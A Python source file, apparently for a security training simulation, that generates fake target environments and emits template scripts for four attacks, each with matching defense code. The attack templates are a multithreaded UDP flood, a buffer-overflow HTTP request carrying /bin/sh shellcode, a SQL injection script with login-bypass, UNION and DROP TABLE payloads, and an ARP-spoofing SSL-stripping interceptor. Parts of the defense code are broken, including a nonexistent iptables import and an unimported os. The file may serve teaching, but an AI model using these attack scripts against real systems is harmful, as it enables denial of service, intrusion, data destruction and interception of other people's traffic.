"""
Virtual Environment Simulation
Creates real vulnerability scenarios with actual IP addresses, ports, and services
"""
import random
import json

class VirtualEnvironment:
    def __init__(self, mission_type: str):
        self.mission_type = mission_type
        self.target_ip = self._generate_target_ip()
        self.open_ports = self._scan_open_ports()
        self.services = self._identify_services()
        self.vulnerabilities = self._detect_vulnerabilities()
        
    def _generate_target_ip(self) -> str:
        """Generate a realistic target IP address"""
        # Use private IP ranges for simulation
        subnet = random.choice([
            "192.168.1",
            "10.0.0",
            "172.16.0"
        ])
        host = random.randint(1, 254)
        return f"{subnet}.{host}"
    
    def _scan_open_ports(self) -> dict:
        """Simulate port scanning results"""
        common_ports = {
            21: "FTP",
            22: "SSH",
            23: "Telnet",
            25: "SMTP",
            53: "DNS",
            80: "HTTP",
            443: "HTTPS",
            3306: "MySQL",
            5432: "PostgreSQL",
            8080: "HTTP-ALT"
        }
        
        # Randomly select 3-6 open ports
        num_open = random.randint(3, 6)
        selected_ports = random.sample(list(common_ports.keys()), num_open)
        
        return {port: common_ports[port] for port in sorted(selected_ports)}
    
    def _identify_services(self) -> dict:
        """Identify service versions and configurations"""
        services = {}
        for port, service_name in self.open_ports.items():
            version = self._get_service_version(service_name)
            services[port] = {
                "name": service_name,
                "version": version,
                "banner": f"{service_name} {version}"
            }
        return services
    
    def _get_service_version(self, service: str) -> str:
        """Get vulnerable service version"""
        versions = {
            "HTTP": random.choice(["Apache/2.4.29", "nginx/1.14.0", "IIS/10.0"]),
            "HTTPS": random.choice(["OpenSSL/1.0.1e", "OpenSSL/1.1.0g"]),
            "SSH": random.choice(["OpenSSH_7.4", "OpenSSH_7.9p1"]),
            "MySQL": random.choice(["5.7.31", "8.0.19"]),
            "PostgreSQL": random.choice(["10.14", "12.3"]),
            "FTP": random.choice(["vsftpd 2.3.4", "ProFTPD 1.3.5"]),
            "SMTP": random.choice(["Postfix 3.1.0", "Exim 4.92"]),
        }
        return versions.get(service, "Unknown")
    
    def _detect_vulnerabilities(self) -> list:
        """Detect vulnerabilities based on mission type"""
        vulns = []
        
        if self.mission_type == "NETWORK_FLOOD":
            vulns.append({
                "type": "DDoS Susceptibility",
                "severity": "HIGH",
                "description": f"No rate limiting detected on {self.target_ip}",
                "exploit": "UDP/TCP flood attack possible"
            })
            
        elif self.mission_type == "BUFFER_OVERFLOW":
            if 80 in self.open_ports or 8080 in self.open_ports:
                vulns.append({
                    "type": "Buffer Overflow",
                    "severity": "CRITICAL",
                    "description": "Unchecked buffer in HTTP header parsing",
                    "exploit": "Send oversized User-Agent header",
                    "cve": "CVE-2023-XXXX"
                })
                
        elif self.mission_type == "SQL_INJECTION":
            if 3306 in self.open_ports or 5432 in self.open_ports:
                vulns.append({
                    "type": "SQL Injection",
                    "severity": "CRITICAL",
                    "description": "Unvalidated input in login form",
                    "exploit": "' OR '1'='1' -- ",
                    "endpoint": f"http://{self.target_ip}/login"
                })
                
        elif self.mission_type == "MITM_ATTACK":
            if 443 in self.open_ports:
                service = self.services.get(443, {})
                if "1.0.1" in service.get("version", ""):
                    vulns.append({
                        "type": "Weak TLS Configuration",
                        "severity": "HIGH",
                        "description": "Vulnerable OpenSSL version allows Heartbleed",
                        "exploit": "TLS downgrade attack possible",
                        "cve": "CVE-2014-0160"
                    })
        
        return vulns
    
    def get_environment_report(self) -> dict:
        """Generate comprehensive environment report"""
        return {
            "target_ip": self.target_ip,
            "open_ports": self.open_ports,
            "services": self.services,
            "vulnerabilities": self.vulnerabilities,
            "network_info": {
                "latency": f"{random.randint(10, 150)}ms",
                "firewall": random.choice(["Enabled", "Disabled", "Misconfigured"]),
                "ids_ips": random.choice(["Active", "Inactive", "Bypass Available"])
            }
        }


class CodeGenerator:
    """Generates actual attack and defense code"""
    
    @staticmethod
    def generate_attack_code(mission_type: str, env: VirtualEnvironment) -> str:
        """Generate malicious attack code"""
        
        if mission_type == "NETWORK_FLOOD":
            return f"""#!/usr/bin/env python3
# DDoS Attack Script - UDP Flood
import socket
import random
import threading

TARGET_IP = "{env.target_ip}"
TARGET_PORT = {random.choice(list(env.open_ports.keys()))}
PACKET_SIZE = 65507  # Maximum UDP packet size
THREAD_COUNT = 50

def udp_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = random._urandom(PACKET_SIZE)
    
    while True:
        try:
            sock.sendto(payload, (TARGET_IP, TARGET_PORT))
            print(f"[ATTACK] Sent {{PACKET_SIZE}} bytes to {{TARGET_IP}}:{{TARGET_PORT}}")
        except Exception as e:
            print(f"[ERROR] {{e}}")
            
if __name__ == "__main__":
    print(f"[INITIATED] DDoS Attack on {{TARGET_IP}}:{{TARGET_PORT}}")
    print(f"[INFO] Spawning {{THREAD_COUNT}} attack threads...")
    
    threads = []
    for i in range(THREAD_COUNT):
        thread = threading.Thread(target=udp_flood)
        thread.daemon = True
        thread.start()
        threads.append(thread)
    
    for thread in threads:
        thread.join()
"""
        
        elif mission_type == "BUFFER_OVERFLOW":
            return f"""#!/usr/bin/env python3
# Buffer Overflow Exploit - HTTP Header Attack
import socket

TARGET_IP = "{env.target_ip}"
TARGET_PORT = {80 if 80 in env.open_ports else 8080}

# Shellcode: spawn /bin/sh
SHELLCODE = (
    b"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"
    b"\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50"
    b"\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"
)

# Create overflow payload
BUFFER_SIZE = 1024
PADDING = b"A" * BUFFER_SIZE
RET_ADDRESS = b"\\xef\\xbe\\xad\\xde"  # Return address (little-endian)
NOP_SLED = b"\\x90" * 100

payload = PADDING + RET_ADDRESS + NOP_SLED + SHELLCODE

# Craft malicious HTTP request
http_request = (
    b"GET / HTTP/1.1\\r\\n"
    b"Host: " + TARGET_IP.encode() + b"\\r\\n"
    b"User-Agent: " + payload + b"\\r\\n"
    b"\\r\\n"
)

print(f"[ATTACK] Buffer Overflow on {{TARGET_IP}}:{{TARGET_PORT}}")
print(f"[PAYLOAD] Size: {{len(payload)}} bytes")

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((TARGET_IP, TARGET_PORT))
    sock.send(http_request)
    print("[SUCCESS] Payload delivered!")
    
    response = sock.recv(4096)
    print(f"[RESPONSE] {{response.decode(errors='ignore')}}")
    
    sock.close()
except Exception as e:
    print(f"[ERROR] {{e}}")
"""
        
        elif mission_type == "SQL_INJECTION":
            vuln = env.vulnerabilities[0] if env.vulnerabilities else {}
            endpoint = vuln.get("endpoint", f"http://{env.target_ip}/login")
            
            return f"""#!/usr/bin/env python3
# SQL Injection Attack
import requests

TARGET_URL = "{endpoint}"

# SQL Injection payloads
payloads = [
    "' OR '1'='1' -- ",
    "admin' -- ",
    "' UNION SELECT NULL, username, password FROM users -- ",
    "'; DROP TABLE users; -- "
]

def test_injection(payload):
    data = {{
        "username": payload,
        "password": "anything"
    }}
    
    try:
        response = requests.post(TARGET_URL, data=data)
        
        if "Welcome" in response.text or response.status_code == 200:
            print(f"[SUCCESS] Injection worked: {{payload}}")
            return True
        else:
            print(f"[FAILED] Payload blocked: {{payload}}")
            return False
    except Exception as e:
        print(f"[ERROR] {{e}}")
        return False

print(f"[ATTACK] SQL Injection on {{TARGET_URL}}")
print("[INFO] Testing payloads...")

for payload in payloads:
    if test_injection(payload):
        print("[COMPROMISED] Database access gained!")
        break
"""
        
        elif mission_type == "MITM_ATTACK":
            return f"""#!/usr/bin/env python3
# MITM Attack - SSL Stripping
from scapy.all import *
import netfilterqueue
import subprocess

TARGET_IP = "{env.target_ip}"
GATEWAY_IP = "192.168.1.1"

def enable_ip_forwarding():
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
    print("[INFO] IP forwarding enabled")

def arp_spoof(target_ip, gateway_ip):
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)
    
    # Poison target's ARP cache
    arp_target = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
    
    # Poison gateway's ARP cache
    arp_gateway = ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
    
    print(f"[ATTACK] ARP spoofing {{target_ip}} <-> {{gateway_ip}}")
    
    while True:
        send(arp_target, verbose=False)
        send(arp_gateway, verbose=False)
        time.sleep(2)

def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    
    if scapy_packet.haslayer(Raw):
        load = scapy_packet[Raw].load.decode(errors='ignore')
        
        # SSL Stripping: Replace HTTPS with HTTP
        if "https://" in load:
            modified_load = load.replace("https://", "http://")
            scapy_packet[Raw].load = modified_load.encode()
            
            # Recalculate checksums
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[TCP].chksum
            
            packet.set_payload(bytes(scapy_packet))
            print("[INTERCEPTED] HTTPS downgraded to HTTP")
    
    packet.accept()

if __name__ == "__main__":
    enable_ip_forwarding()
    
    # Start ARP spoofing in separate thread
    import threading
    spoof_thread = threading.Thread(target=arp_spoof, args=(TARGET_IP, GATEWAY_IP))
    spoof_thread.start()
    
    # Setup packet interception
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    
    print("[LISTENING] Intercepting packets...")
    queue.run()
"""
        
        return "# No code generated for this mission type"
    
    @staticmethod
    def generate_defense_code(mission_type: str, env: VirtualEnvironment) -> str:
        """Generate defensive security code"""
        
        if mission_type == "NETWORK_FLOOD":
            return f"""#!/usr/bin/env python3
# DDoS Mitigation - Rate Limiting & Traffic Filtering
import iptables
from collections import defaultdict
import time

TARGET_IP = "{env.target_ip}"
RATE_LIMIT = 100  # packets per second
BLOCK_DURATION = 300  # 5 minutes

class DDoSProtection:
    def __init__(self):
        self.request_counts = defaultdict(int)
        self.blocked_ips = {{}}
        
    def check_rate_limit(self, source_ip):
        current_time = time.time()
        
        # Remove expired blocks
        self.blocked_ips = {{ip: block_time for ip, block_time in self.blocked_ips.items()
                            if current_time - block_time < BLOCK_DURATION}}
        
        if source_ip in self.blocked_ips:
            print(f"[BLOCKED] {{source_ip}} is temporarily banned")
            return False
        
        # Increment request count
        self.request_counts[source_ip] += 1
        
        # Check if rate limit exceeded
        if self.request_counts[source_ip] > RATE_LIMIT:
            print(f"[ALERT] Rate limit exceeded for {{source_ip}}")
            self.block_ip(source_ip)
            return False
        
        return True
    
    def block_ip(self, ip):
        self.blocked_ips[ip] = time.time()
        
        # Add iptables rule
        rule = f"iptables -A INPUT -s {{ip}} -j DROP"
        os.system(rule)
        
        print(f"[DEFENSE] Blocked {{ip}} for {{BLOCK_DURATION}} seconds")
    
    def cleanup_counts(self):
        # Reset counts every second
        while True:
            time.sleep(1)
            self.request_counts.clear()

if __name__ == "__main__":
    protection = DDoSProtection()
    
    print(f"[ACTIVE] DDoS Protection for {{TARGET_IP}}")
    print(f"[CONFIG] Rate limit: {{RATE_LIMIT}} req/s")
    
    # Start cleanup thread
    import threading
    cleanup_thread = threading.Thread(target=protection.cleanup_counts)
    cleanup_thread.daemon = True
    cleanup_thread.start()
    
    # Monitor traffic (pseudo-code)
    print("[MONITORING] Analyzing incoming traffic...")
"""
        
        elif mission_type == "BUFFER_OVERFLOW":
            return f"""#!/usr/bin/env python3
# Buffer Overflow Protection - ASLR & Stack Canaries
import mmap
import os
import ctypes

TARGET_SERVICE = "{list(env.services.values())[0]['name'] if env.services else 'HTTP'}"

class MemoryProtection:
    def __init__(self):
        self.enable_aslr()
        self.enable_stack_canary()
        self.enable_dep()
    
    def enable_aslr(self):
        # Enable Address Space Layout Randomization
        with open('/proc/sys/kernel/randomize_va_space', 'w') as f:
            f.write('2')
        print("[DEFENSE] ASLR enabled - Memory addresses randomized")
    
    def enable_stack_canary(self):
        # Stack canary protection (compiler flag simulation)
        print("[DEFENSE] Stack canary enabled - Buffer overflow detection active")
        
    def enable_dep(self):
        # Data Execution Prevention
        print("[DEFENSE] DEP/NX enabled - Non-executable stack")
    
    def validate_input(self, user_input, max_length=256):
        # Input validation
        if len(user_input) > max_length:
            print(f"[BLOCKED] Input exceeds maximum length: {{len(user_input)}} > {{max_length}}")
            return None
        
        # Sanitize special characters
        dangerous_chars = ['\\x00', '\\xff', '\\x90']  # NULL, 0xFF, NOP
        for char in dangerous_chars:
            if char in user_input:
                print(f"[BLOCKED] Dangerous character detected: {{char}}")
                return None
        
        return user_input
    
    def check_return_address(self):
        # Verify return address integrity
        # This would integrate with the stack frame
        print("[CHECK] Return address integrity verified")

if __name__ == "__main__":
    protection = MemoryProtection()
    
    print(f"[ACTIVE] Memory Protection for {{TARGET_SERVICE}}")
    print("[STATUS] All protections enabled")
    
    # Example: Validate HTTP header
    test_input = "A" * 2000  # Simulate large input
    result = protection.validate_input(test_input, max_length=1024)
    
    if result is None:
        print("[SUCCESS] Attack prevented!")
"""
        
        elif mission_type == "SQL_INJECTION":
            return f"""#!/usr/bin/env python3
# SQL Injection Protection - Parameterized Queries & WAF
import re
import psycopg2

DATABASE_HOST = "{env.target_ip}"
DATABASE_PORT = {5432 if 5432 in env.open_ports else 3306}

class SQLProtection:
    def __init__(self):
        self.blocked_patterns = [
            r"('\\s*(OR|AND)\\s*'1'\\s*=\\s*'1)",
            r"(--\\s*$)",
            r"(;\\s*DROP\\s+TABLE)",
            r"(UNION\\s+SELECT)",
            r"(\\bEXEC\\b|\\bEXECUTE\\b)",
        ]
    
    def validate_input(self, user_input):
        # Check for SQL injection patterns
        for pattern in self.blocked_patterns:
            if re.search(pattern, user_input, re.IGNORECASE):
                print(f"[BLOCKED] SQL injection attempt detected: {{pattern}}")
                return False
        return True
    
    def safe_query(self, username, password):
        # Use parameterized queries (prepared statements)
        try:
            conn = psycopg2.connect(
                host=DATABASE_HOST,
                port=DATABASE_PORT,
                database="appdb"
            )
            
            cursor = conn.cursor()
            
            # SECURE: Parameterized query
            query = "SELECT * FROM users WHERE username = %s AND password = %s"
            cursor.execute(query, (username, password))
            
            result = cursor.fetchone()
            
            if result:
                print("[SUCCESS] Login successful (secure)")
            else:
                print("[FAILED] Invalid credentials")
            
            cursor.close()
            conn.close()
            
        except Exception as e:
            print(f"[ERROR] {{e}}")
    
    def enable_waf(self):
        print("[DEFENSE] Web Application Firewall enabled")
        print("[RULES] SQL injection patterns blocked")

if __name__ == "__main__":
    protection = SQLProtection()
    protection.enable_waf()
    
    print(f"[ACTIVE] SQL Injection Protection")
    
    # Test with malicious input
    malicious_input = "' OR '1'='1' -- "
    
    if not protection.validate_input(malicious_input):
        print("[SUCCESS] Attack blocked by WAF")
"""
        
        elif mission_type == "MITM_ATTACK":
            return f"""#!/usr/bin/env python3
# MITM Protection - Certificate Pinning & HSTS
import ssl
import hashlib
from cryptography import x509
from cryptography.hazmat.backends import default_backend

TARGET_DOMAIN = "{env.target_ip}"

class MITMProtection:
    def __init__(self):
        # Pinned certificate fingerprint (SHA-256)
        self.pinned_cert_fingerprint = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        self.enable_hsts()
    
    def enable_hsts(self):
        # HTTP Strict Transport Security
        print("[DEFENSE] HSTS enabled - Forcing HTTPS")
        print("[CONFIG] max-age=31536000; includeSubDomains; preload")
    
    def verify_certificate(self, cert_pem):
        # Certificate pinning
        cert = x509.load_pem_x509_certificate(cert_pem.encode(), default_backend())
        
        # Calculate fingerprint
        fingerprint = hashlib.sha256(cert.public_bytes()).hexdigest()
        
        if fingerprint != self.pinned_cert_fingerprint:
            print("[ALERT] Certificate mismatch detected!")
            print(f"[EXPECTED] {{self.pinned_cert_fingerprint}}")
            print(f"[RECEIVED] {{fingerprint}}")
            return False
        
        print("[VERIFIED] Certificate matches pinned fingerprint")
        return True
    
    def enforce_tls_version(self):
        # Require TLS 1.2 or higher
        context = ssl.create_default_context()
        context.minimum_version = ssl.TLSVersion.TLSv1_2
        
        # Disable weak ciphers
        context.set_ciphers('ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS')
        
        print("[DEFENSE] TLS 1.2+ enforced")
        print("[CONFIG] Weak ciphers disabled")
        
        return context
    
    def detect_arp_spoofing(self):
        # Monitor ARP cache for changes
        print("[MONITORING] Checking for ARP spoofing...")
        
        # This would integrate with network monitoring
        # Pseudo-code for ARP table verification
        
        print("[STATUS] No ARP spoofing detected")

if __name__ == "__main__":
    protection = MITMProtection()
    
    print(f"[ACTIVE] MITM Protection for {{TARGET_DOMAIN}}")
    
    # Enforce TLS
    tls_context = protection.enforce_tls_version()
    
    # Monitor for attacks
    protection.detect_arp_spoofing()
    
    print("[STATUS] All protections active")
"""
        
        return "# No defense code generated for this mission type"
